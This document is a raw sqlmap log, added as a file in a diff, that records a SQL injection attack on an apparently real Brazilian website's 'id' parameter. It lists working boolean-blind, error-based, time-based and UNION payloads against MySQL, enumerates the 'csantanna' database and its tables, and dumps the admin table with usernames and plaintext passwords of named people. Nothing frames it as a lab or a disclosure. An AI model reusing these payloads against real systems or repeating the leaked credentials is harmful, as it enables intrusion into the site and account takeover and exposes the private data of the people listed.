@@ -1,0 +1,122 @@
+sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=54 AND 3382=3382
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=54 AND (SELECT 9479 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(9479=9479,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=54 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-6901 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x7a6a707a6d55546471544375456b6458724755485345456c747078756b7067704b49464c4c517841,0x716a626b71),NULL,NULL,NULL,NULL-- zjkK
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Nginx, Plesk
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] csantanna
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=54 AND 3382=3382
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=54 AND (SELECT 9479 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(9479=9479,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=54 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-6901 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x7a6a707a6d55546471544375456b6458724755485345456c747078756b7067704b49464c4c517841,0x716a626b71),NULL,NULL,NULL,NULL-- zjkK
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Nginx, Plesk
+back-end DBMS: MySQL >= 5.0
+Database: csantanna
+[10 tables]
++-------------------+
+| local             |
+| admin             |
+| banners           |
+| clientes          |
+| faleconosco_setor |
+| fotos             |
+| noticias          |
+| obras             |
+| obras_categorias  |
+| textos            |
++-------------------+
+
+Database: csantanna
++------------------+---------+
+| Table            | Entries |
++------------------+---------+
+| fotos            | 200     |
+| banners          | 81      |
+| textos           | 80      |
+| obras            | 21      |
+| `local`          | 16      |
+| noticias         | 14      |
+| obras_categorias | 14      |
+| admin            | 3       |
++------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=54 AND 3382=3382
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=54 AND (SELECT 9479 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(9479=9479,1))),0x716a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=54 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-6901 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x7a6a707a6d55546471544375456b6458724755485345456c747078756b7067704b49464c4c517841,0x716a626b71),NULL,NULL,NULL,NULL-- zjkK
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Nginx, Plesk
+back-end DBMS: MySQL >= 5.0
+Database: csantanna
+Table: admin
+[3 entries]
++----+----------+-----------------------------------+--------------------------------+
+| id | nome     | senha                             | usuario                        |
++----+----------+-----------------------------------+--------------------------------+
+| 19 | grupo    | !QA@WS#ED$RF%TG\x88YH&UJ*ik(ol)p; | AQ!SW@DE#FR$gt5hy6ju7ki8lo9;p0 |
+| 21 | grupo    | C$l_21252552                      | Paulo.Andre                    |
+| 22 | Glaysson | C$l2565                           | glayssonalcantara              |
++----+----------+-----------------------------------+--------------------------------+
+
